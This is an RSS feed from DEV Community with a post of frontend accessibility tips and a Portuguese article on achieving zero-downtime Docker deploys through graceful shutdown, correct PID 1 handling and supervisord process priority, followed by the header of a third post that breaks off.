<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0">
  <channel>
    <title>DEV Community</title>
    <author>DEV Community</author>
    <description>A constructive and inclusive social network for software developers. With you every step of your journey.</description>
    <link>https://dev.to</link>
    <language>en</language>
    <item>
      <title>The 3 Short Frontend tips for December</title>
      <author>Stas Melnikov</author>
      <pubDate>Tue, 07 Dec 2021 21:40:32 +0000</pubDate>
      <link>https://dev.to/melnik909/the-3-short-frontend-tips-for-december-3h90</link>
      <guid>https://dev.to/melnik909/the-3-short-frontend-tips-for-december-3h90</guid>
      <description>&lt;h2&gt;
  &lt;a href="#help-users-with-vision-disabilities-find-a-search"&gt;
  &lt;/a&gt;
  Help users with vision disabilities find a search
&lt;/h2&gt;

&lt;p&gt;Usually we know how to place a search for users without vision disabilities. But how should we do that for users with disabilities?&lt;/p&gt;

&lt;p&gt;There is a special search role in the WAI-ARIA standard that we should add for the form element. In this case screen readers will start to display search in the "Regions list" mode that is used by users for navigation.&lt;/p&gt;

&lt;p&gt;Pay attention, if we don't do that search will not be displayed in this mode. So it will hamper users start interaction with search. They will have to find a search using common keys. It's much longer than if they use the "Regions list" mode.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--MTpYVRqs--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.substack.com/image/fetch/w_1456%2Cc_limit%2Cf_auto%2Cq_auto:good%2Cfl_progressive:steep/https%253A%252F%252Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%252Fpublic%252Fimages%252F382c6125-e6a0-45d3-97d8-929b423f33f3_1080x1080.jpeg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--MTpYVRqs--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.substack.com/image/fetch/w_1456%2Cc_limit%2Cf_auto%2Cq_auto:good%2Cfl_progressive:steep/https%253A%252F%252Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%252Fpublic%252Fimages%252F382c6125-e6a0-45d3-97d8-929b423f33f3_1080x1080.jpeg" alt="A search is created using the form element with the search role is good solution" width="880" height="880"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#thinking-about-a-main-and-additional-goal-when-we-work-with-focus"&gt;
  &lt;/a&gt;
  Thinking about a main and additional goal when we work with focus
&lt;/h2&gt;

&lt;p&gt;Did you think sometimes about how better to move focus when users open elements such as modals or dialogs? &lt;/p&gt;

&lt;p&gt;I think there is a main and additional goal when we work with focus. The main goal is what users want to do after moving focus for reaching their goals using a minimal number of actions. An additional is what they can do something else.&lt;/p&gt;

&lt;p&gt;Let's consider what I mean using the case of selecting a language on Booking. If we push the button of selecting a language we'll see modal with languages. &lt;/p&gt;

&lt;p&gt;Focus will move on the close button. Nice what we can close modal by pushing the enter key. But is that why we open the modal? No, we wanted to select a language. That's the main goal. And closing a modal is an additional goal.&lt;/p&gt;

&lt;p&gt;Now let's look at what Booking suggests for selecting a language. If we use only a keyboard we have to use the tab, ‚Üë or ‚Üì keys to start moving between languages. &lt;/p&gt;

&lt;p&gt;Then we push the same keys again until we find the necessary option.  If we push the enter key we'll select a language. Well, that's a nice solution but I want to suggest another. &lt;/p&gt;

&lt;p&gt;We have already identified that users open the modal because they want to select a language. It's the main goal. So we should give that to them. I think we can do that if we move focus on the current language. &lt;/p&gt;

&lt;p&gt;Then we should make the possibility of moving between languages using tab, ‚Üë, ‚Üí,  ‚Üì or ‚Üê keys immediately. The selection of a language we'll make using the enter key.  Also, we'll save the possibility of closing the modal using the Esc key like Booking made.&lt;/p&gt;

&lt;p&gt;I hope I was able to pass on the importance of defining a main and additional goal when you work with focus. Please, think about it and your interfaces will be user-friendly. &lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--ofSE41h2--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.substack.com/image/fetch/w_1456%2Cc_limit%2Cf_auto%2Cq_auto:good%2Cfl_progressive:steep/https%253A%252F%252Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%252Fpublic%252Fimages%252Fb03437f0-2564-4e99-bec4-ea01faa60c2a_1080x1080.jpeg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--ofSE41h2--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.substack.com/image/fetch/w_1456%2Cc_limit%2Cf_auto%2Cq_auto:good%2Cfl_progressive:steep/https%253A%252F%252Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%252Fpublic%252Fimages%252Fb03437f0-2564-4e99-bec4-ea01faa60c2a_1080x1080.jpeg" alt="" width="880" height="880"&gt;&lt;/a&gt;&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--IlXvDlve--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.substack.com/image/fetch/w_1456%2Cc_limit%2Cf_auto%2Cq_auto:good%2Cfl_progressive:steep/https%253A%252F%252Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%252Fpublic%252Fimages%252F36ff8283-37e7-43fb-a859-888744e72d22_1080x1080.jpeg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--IlXvDlve--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.substack.com/image/fetch/w_1456%2Cc_limit%2Cf_auto%2Cq_auto:good%2Cfl_progressive:steep/https%253A%252F%252Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%252Fpublic%252Fimages%252F36ff8283-37e7-43fb-a859-888744e72d22_1080x1080.jpeg" alt="" width="880" height="880"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#a-highcontrast-background-color-is-a-simple-way-for-improving-content-accessibility"&gt;
  &lt;/a&gt;
  A high-contrast background color is a simple way for improving content accessibility
&lt;/h2&gt;

&lt;p&gt;In modern web design, we often meet with media content. Yes, that's a great way to draw users' attention. But we can make the mistake that will affect content accessibility. &lt;/p&gt;

&lt;p&gt;Loading of media content takes some time. At this moment, elements might be mixed with the page background color. As a result, users can't interact with them. They will be confused. &lt;/p&gt;

&lt;p&gt;For fixing this problem, we should add a high-contrast background color using the background-color property to the element with media content. Thus users will see all content and can interact with it.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--hTal1Bh9--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.substack.com/image/fetch/w_1456%2Cc_limit%2Cf_auto%2Cq_auto:good%2Cfl_progressive:steep/https%253A%252F%252Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%252Fpublic%252Fimages%252Fdf223a77-92bd-43b6-8c67-d13c0e14d2e6_1080x1080.jpeg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--hTal1Bh9--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.substack.com/image/fetch/w_1456%2Cc_limit%2Cf_auto%2Cq_auto:good%2Cfl_progressive:steep/https%253A%252F%252Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%252Fpublic%252Fimages%252Fdf223a77-92bd-43b6-8c67-d13c0e14d2e6_1080x1080.jpeg" alt="" width="880" height="880"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--5RL98i1V--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.substack.com/image/fetch/w_1456%2Cc_limit%2Cf_auto%2Cq_auto:good%2Cfl_progressive:steep/https%253A%252F%252Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%252Fpublic%252Fimages%252Fd12c92c6-d38f-4255-8b89-fecfb7202948_1080x1080.jpeg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--5RL98i1V--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.substack.com/image/fetch/w_1456%2Cc_limit%2Cf_auto%2Cq_auto:good%2Cfl_progressive:steep/https%253A%252F%252Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%252Fpublic%252Fimages%252Fd12c92c6-d38f-4255-8b89-fecfb7202948_1080x1080.jpeg" alt="" width="880" height="880"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;P.S.&lt;/strong&gt;&lt;br&gt;
‚ù§ Thank you so much, my sponsors: Ben Rinehart, Sergio Kagiema, Jesse Willard, Tanya Ten, Spiridon Konofaos&lt;/p&gt;

&lt;p&gt;üí™ Get more free tips &lt;a href="https://uxa11y.substack.com"&gt;directly to your inbox&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;üëÄ Also I tell stories from my career on Substack. Join &lt;a href="https://stasmelnikov.substack.com"&gt;my free newsletter&lt;/a&gt;, if you're interested in my background&lt;/p&gt;

</description>
      <category>ux</category>
      <category>css</category>
      <category>webdev</category>
      <category>a11y</category>
    </item>
    <item>
      <title>Os cuidados para um deploy "Zero Down Time"</title>
      <author>Leonardo Lemos</author>
      <pubDate>Tue, 07 Dec 2021 21:36:15 +0000</pubDate>
      <link>https://dev.to/convenia/os-cuidados-para-um-deploy-zero-down-time-5a3</link>
      <guid>https://dev.to/convenia/os-cuidados-para-um-deploy-zero-down-time-5a3</guid>
      <description>&lt;p&gt;Atualmente existem ferramentas que nos ajudam a executar containers em produ√ß√£o e a maioria delas trazem funcionalidades preciosas como "Health Checks", "Limite de recursos" e at√© mesmo prometem um deploy &lt;a href="https://avikdas.com/2020/06/30/scalability-concepts-zero-downtime-deployments.html"&gt;"Zero Down Time"&lt;/a&gt;, o foco deste post √© nesse √∫ltimo Item. Na &lt;a href="https://convenia.com.br/"&gt;Convenia&lt;/a&gt; utilizamos o &lt;a href="https://docs.docker.com/engine/swarm/"&gt;Docker Swarm&lt;/a&gt; para gerenciar alguns containers em produ√ß√£o e o Docker Swarm entrega esse tipo de deploy "Zero Down Time" atrav√©s de uma simples configura√ß√£o, por√©m ap√≥s alguns testes em uma API sob stress constatamos que sempre ocorriam alguns erros no momento do deploy. Aprofundando a an√°lise do que poderia causar esses erros, percebemos que podemos cometer alguns "equ√≠vocos" que nos impedem de ter um deploy verdadeiramente sem Down Time e ainda podemos constatar que esses "equ√≠vocos" s√£o comuns em outras ferramentas como &lt;a href="https://kubernetes.io/pt-br/"&gt;Kubernetes&lt;/a&gt; tamb√©m, dai saiu a motiva√ß√£o para escrever esse post.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#graceful-shutdown"&gt;
  &lt;/a&gt;
  Graceful ShutDown
&lt;/h2&gt;

&lt;p&gt;A grosso modo podemos definir "Graceful shutdown" como a maneira "natural" em que um processo √© desligado. Muitos processos abrem sockets e trabalham com estado em mem√≥ria ent√£o para esses processos desligarem naturalmente muito provavelmente eles v√£o fechar as conex√µes abertas e persistirem o estado, que est√° na mem√≥ria, no HD para que n√£o haja perda de dados e para poder retomarem as atividades sem maiores problemas quando forem reiniciados, em uma queda de energia por exemplo, os processos n√£o tem esse privil√©gio, nesse caso podemos nos deparar com erros durante a pr√≥xima inicializa√ß√£o do processo, isso √© conhecido como "Hard Shutdown".&lt;/p&gt;

&lt;p&gt;A boa not√≠cia √© que todos os softwares mais difundidos fazem isso por padr√£o, o &lt;a href="https://www.nginx.com/"&gt;nginx&lt;/a&gt; quando recebe o "sinal" de desligamento espera a resposta de todos os requests que est√£o em execu√ß√£o no momento, antes de desligar de fato. Esse "Graceful Shutdown" √© importante porque o deploy consiste na "troca" de um processo com a vers√£o antiga do software pelo mesmo processo contendo a vers√£o nova, ao desligar o processo contendo a vers√£o antiga, os requests que estiverem em execu√ß√£o n√£o podem falhar, pois eles ainda est√£o sendo respondidos pelo processo antigo enquanto os novos requests j√° est√£o sendo servidos pelo processo novo como mostrado na imagem abaixo.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--kti9Rd0V--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/ft293jsqsbem1iyh7dbf.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--kti9Rd0V--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/ft293jsqsbem1iyh7dbf.png" alt="Troca dos containers em um deploy" width="741" height="362"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Na &lt;a href="https://convenia.com.br"&gt;Convenia&lt;/a&gt; temos muitos listeners feitos com o &lt;a href="https://convenia.github.io/Pigeon/#/"&gt;Pigeon&lt;/a&gt;, nesse caso n√£o estamos falando de um webserver e sim de um &lt;a href="https://convenia.github.io/Pigeon/#/EVENT_DRIVEN?id=listening-for-events"&gt;consumer&lt;/a&gt; que "ouve" uma fila do &lt;a href="https://www.rabbitmq.com/"&gt;RabbitMQ&lt;/a&gt;, voc√™ j√° deve imaginar que para "ouvir" essa fila temos que ter uma conex√£o aberta com o &lt;a href="https://www.rabbitmq.com/"&gt;RabbitMQ&lt;/a&gt; ent√£o nada mais justo que fechar as conex√µes no momento em que o processo for desligado, √© justamente isso que o &lt;a href="https://convenia.github.io/Pigeon/#/"&gt;Pigeon&lt;/a&gt; faz no c√≥digo a seguir:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;    &lt;span class="k"&gt;protected&lt;/span&gt; &lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="n"&gt;listenSignals&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt; &lt;span class="kt"&gt;void&lt;/span&gt;
    &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="nb"&gt;defined&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'AMQP_WITHOUT_SIGNALS'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;?:&lt;/span&gt; &lt;span class="nb"&gt;define&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'AMQP_WITHOUT_SIGNALS'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kc"&gt;false&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

        &lt;span class="nb"&gt;pcntl_async_signals&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

        &lt;span class="nb"&gt;pcntl_signal&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="no"&gt;SIGTERM&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;$this&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;'signalHandler'&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
        &lt;span class="nb"&gt;pcntl_signal&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="no"&gt;SIGINT&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;$this&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;'signalHandler'&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
        &lt;span class="nb"&gt;pcntl_signal&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="no"&gt;SIGQUIT&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;$this&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;'signalHandler'&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;

    &lt;span class="k"&gt;public&lt;/span&gt; &lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="n"&gt;signalHandler&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$signalNumber&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="k"&gt;switch&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$signalNumber&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="k"&gt;case&lt;/span&gt; &lt;span class="no"&gt;SIGTERM&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;  &lt;span class="c1"&gt;// 15 : supervisor default stop&lt;/span&gt;
                &lt;span class="nv"&gt;$this&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="nf"&gt;quitHard&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
                &lt;span class="k"&gt;break&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
            &lt;span class="k"&gt;case&lt;/span&gt; &lt;span class="no"&gt;SIGQUIT&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;  &lt;span class="c1"&gt;// 3  : kill -s QUIT&lt;/span&gt;
                &lt;span class="nv"&gt;$this&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="nf"&gt;quitHard&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
                &lt;span class="k"&gt;break&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
            &lt;span class="k"&gt;case&lt;/span&gt; &lt;span class="no"&gt;SIGINT&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;   &lt;span class="c1"&gt;// 2  : ctrl+c&lt;/span&gt;
                &lt;span class="nv"&gt;$this&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="nf"&gt;quit&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
                &lt;span class="k"&gt;break&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Nesse c√≥digo definimos handlers para os sinais de desligamento que o processo pode receber e chamamos os m√©todos &lt;code&gt;quit()&lt;/code&gt; e &lt;code&gt;quitHard()&lt;/code&gt; que t√™m como objetivo fechar a conex√£o com o RabbitMQ. At√© agora falamos muito sobre esses sinais que os processos podem receber de outro processos, ou at√© mesmo do kernel, mas caso voc√™ n√£o estaja familiarizado ou se n√£o souber exatamente a diferen√ßa entre eles, voc√™ pode ficar um pouco mais por dentro &lt;a href="https://www.ctl.io/developers/blog/post/gracefully-stopping-docker-containers/"&gt;nesse artigo&lt;/a&gt;.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#pid-1"&gt;
  &lt;/a&gt;
  PID 1
&lt;/h2&gt;

&lt;p&gt;Quando utilizamos &lt;a href="https://www.docker.com/"&gt;docker&lt;/a&gt; para executar nossa aplica√ß√£o em produ√ß√£o e fazemos um deploy, um container com a nova vers√£o da aplica√ß√£o √© iniciado,o container com a vers√£o antiga da aplica√ß√£o recebe o sinal "SIGTERM" que √© um pedido formal de desligamento, caso o container demore mais que 10 segundos para  desligar ele ser√° morto, logo o processo dentro do container tem 10 segundos para fazer o seu "Graceful Shutdown". A grande pegadinha √© que dentro do container apenas o processo de ID 1 vai receber esse sinal, se dentro do container iniciarmos um outro processo antes da nossa aplica√ß√£o, esse processo vai portar o id 1 e n√£o a nossa aplica√ß√£o. Agora que temos outro processo recebendo os sinais de desligamento no lugar da nossa aplica√ß√£o, nunca vamos ter a oportunidade de fazer um Graceful Shutdown porque nunca saberemos o momento de desligar, por mais que esse pare√ßa um erro bobo na verdade isso acaba acontecendo com uma certa frequ√™ncia como por exemplo nos &lt;a href="https://docs.docker.com/engine/reference/builder/"&gt;Dockerfiles&lt;/a&gt; a seguir:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight docker"&gt;&lt;code&gt;&lt;span class="k"&gt;FROM&lt;/span&gt;&lt;span class="s"&gt; nginx:latest&lt;/span&gt;

&lt;span class="k"&gt;ENTRYPOINT&lt;/span&gt;&lt;span class="s"&gt; ["nginx", "-g", "daemon off;"]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;O Dockerfile acima est√° com o &lt;code&gt;ENTRYPOINT&lt;/code&gt; no formato de array, se voc√™ entrar dentro do container gerado por esse Dockerfie e executar o comando &lt;code&gt;pstree&lt;/code&gt; ver√° o seguinte output:&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--_7H596n2--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/du8k1y9gv6pgpl7bii58.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--_7H596n2--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/du8k1y9gv6pgpl7bii58.png" alt="Output do comando pstree em um container corretamente configurado" width="756" height="444"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Perceba que o "nginx" √© o primeiro processo mais a esquerda, isso significa que atingiremos o objetivo de ter um Graceful Shutdown visto que o nginx vai receber os sinais pessoalmente e ele sabe muito bem como lidar, para tirar a d√∫vida podemos executar um &lt;code&gt;docker stop&lt;/code&gt; no container em execu√ß√£o e provavelmente veremos o container sendo desligado quase instantaneamente.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight docker"&gt;&lt;code&gt;&lt;span class="k"&gt;FROM&lt;/span&gt;&lt;span class="s"&gt; nginx:latest&lt;/span&gt;

&lt;span class="k"&gt;ENTRYPOINT&lt;/span&gt;&lt;span class="s"&gt; nginx -g 'daemon off;'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;A Mudan√ßa no dockerfile acima foi sutil, mas faz toda a diferen√ßa, com a sintaxe corrida do &lt;code&gt;ENTRYPOINT&lt;/code&gt; o comando em quest√£o √© executato pelo shell dentro do container, segue o output do &lt;code&gt;pstree&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--1i-Qiwoa--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/7d1x9fa3ekg7ei2x0oll.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--1i-Qiwoa--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/7d1x9fa3ekg7ei2x0oll.png" alt="output do comando pstree em um container mal configurado" width="756" height="444"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Agora o processo mais a esquerda √© o &lt;code&gt;sh&lt;/code&gt;, ele quem receber√° os sinais de desligamento e por acaso n√£o sabe muito bem o que fazer com esses sinais, se voc√™ executar um &lt;code&gt;docker stop&lt;/code&gt; nesse container ver√° que demora 10 segundos para parar, dessa forma n√£o faremos o "Graceful Shutdown" e nunca teremos um verdadeiro deploy "Zero Down Time" porque sempre que o container com a vers√£o antiga do c√≥digo morrer, vai levar os requests que est√£o em execu√ß√£o para a vala junto. Logo devemos nos assegurar que nosso processo est√° recebendo o sinal de desligamento corretamente.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#v%C3%A1rios-processos-no-mesmo-container"&gt;
  &lt;/a&gt;
  V√°rios processos no mesmo container
&lt;/h2&gt;

&lt;p&gt;√â conceitualmente correto que o container contenha apenas um processo(PID 1), mas √© relativamente comum aparecer a necessidade de executar mais de um processo no mesmo container. Tomando como exemplo uma aplica√ß√£o &lt;a href="https://www.php.net/"&gt;PHP&lt;/a&gt;, que n√£o √© capaz de responder como uma aplica√ß√£o completa(HTTP) apenas com o processo do &lt;a href="https://www.php.net/manual/pt_BR/install.fpm.php"&gt;PHP-FPM&lt;/a&gt;, pois necessita de um &lt;a href="https://www.nginx.com/resources/glossary/reverse-proxy-server/"&gt;reverse proxy&lt;/a&gt; como &lt;a href="https://www.apache.org/"&gt;apache&lt;/a&gt; ou &lt;a href="https://www.nginx.com/"&gt;nginx&lt;/a&gt; para isso, como poder√≠amos fazer um √∫nico container  contendo tanto nginx como php-fmp e que funcione como uma aplica√ß√£o completa capaz de entender o protocolo HTTP? A pr√≥pria &lt;a href="https://docs.docker.com/config/containers/multi-service_container/"&gt;documenta√ß√£o do docker nos traz algumas recomenda√ß√µes&lt;/a&gt; sendo que dentre elas a melhor seria utilizar o &lt;a href="http://supervisord.org/"&gt;supervisord&lt;/a&gt; como processo principal no container, cuidando dos outros processos. O supervisord √© capaz de propagar os sinais de desligamento que recebe para os processos filhos, sendo assim tanto o nginx quanto o PHP-FPM ter√£o a possibilidade de fazer um "Graceful Shutdown" assim que o supervisord receber o sinal SIGTERM.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#prioridade-dos-processos-dentro-do-container"&gt;
  &lt;/a&gt;
  Prioridade dos processos dentro do container
&lt;/h2&gt;

&lt;p&gt;Bom temos uma aplica√ß√£o PHP sendo executada em produ√ß√£o e seguimos tudo que foi falado at√© agora, estamos executando tanto o php-fpm quanto o nginx, ambos rodando sobre o supervisord, por√©m por incr√≠vel que pare√ßa estamos notando o erro &lt;code&gt;502&lt;/code&gt; durante o deploy. Isso acontece porque durante o deploy um novo container √© criado e o supervisord simplesmente n√£o sabe qual processo deve iniciar primeiro, se por acaso o nginx estiver pronto para receber um request, mas o php-fpm ainda n√£o foi corretamente iniciado ent√£o temos um &lt;code&gt;502&lt;/code&gt;. Resolver esse problema de prioridade entre os processos √© relativamente simples, o supervisord tem uma flag priority que tem o proposito de dizer quem √© o processo de maior prioridade, entre outras palavras esse processo deve ser criado primeiro e morrer por √∫ltimo, a seguir segue uma configura√ß√£o real de uma aplica√ß√£o da &lt;a href="https://convenia.com.br"&gt;Convenia&lt;/a&gt; em produ√ß√£o:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;[supervisord]
nodaemon=true

[program:nginx]
command = nginx -c /etc/nginx/nginx.conf  -g 'daemon off;'
user = app
autostart = true
stdout_logfile=/dev/stdout
stdout_logfile_maxbytes=0
redirect_stderr=true

[program:php-fpm]
command = /usr/sbin/php-fpm7 -F
priority = 1
user = app
autostart = true
stdout_logfile=/dev/stdout
stdout_logfile_maxbytes=0
redirect_stderr=true
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Esse √© um arquivo de configura√ß√£o do supervisord, perceba a configura√ß√£o do php-fpm &lt;code&gt;priority = 1&lt;/code&gt;, essa configura√ß√£o vai instruir o supervisord a criar o php-fpm primeiro e a desligar ele por √∫ltimo, agora sim temos um deploy perfeito, sem downtime.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#conclus%C3%A3o"&gt;
  &lt;/a&gt;
  Conclus√£o
&lt;/h2&gt;

&lt;p&gt;Para alcan√ßar um deploy perfeito n√£o adianta simplesmente utilizar os orquestradores mais poderosos do mercado, precisamos tomar alguns cuidados com o nosso container e aplica√ß√£o tamb√©m:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Garantir que a aplica√ß√£o √© capaz de fazer um Graceful Shutdown&lt;/li&gt;
&lt;li&gt;Garantir que a aplica√ß√£o est√° recebendo os sinais de desligamento corretamente, ou mantendo a aplica√ß√£o como sendo o primeiro processo dentro do container, ou utilizando alguma ferramenta como o supervisord que propaga os sinais que ela recebe.&lt;/li&gt;
&lt;li&gt;Garantir que os processos est√£o sendo iniciados e desligados na ordem correta, caso o container rode mais de um processo.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Tomado esses cuidados estamos prontos para ter um deploy sem Downtime.&lt;/p&gt;

</description>
      <category>docker</category>
      <category>deploy</category>
      <category>php</category>
      <category>laravel</category>
    </item>
    <item>
      <title>Heads up: Stackbit integration removal</title>
      <author>Ben Halpern</author>
      <pubDate>Tue, 07 Dec 2021 21:32:40 +0000</pubDate>
      <link>https://dev.to/devteam/heads-up-stackbit-integration-removal-2m11</link>
      <guid>https://dev.to/devteam/heads-up-stackbit-integration-removal-2m11</guid>
